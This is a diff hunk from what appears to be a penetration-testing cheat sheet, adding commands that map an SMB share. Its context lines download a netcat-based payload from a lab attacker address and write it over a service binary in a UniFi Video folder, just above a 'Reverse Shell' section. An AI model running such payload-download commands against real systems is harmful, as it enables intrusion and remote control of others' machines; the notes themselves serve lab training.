@@ -11,6 +11,15 @@ Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
 wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
 ```
 
+Conenct to smb share
+```cmd
+net use z: \\$ip\share_name /user:domain\username password
+```
+```powershell
+New-SmbSession -LocalPath 'X:' -RemotePath \\%ip\share_name -Username <username> -Password <password>
+```
+
+
 ## Reverse Shell
 
 ### Download and execute #reverseshell 
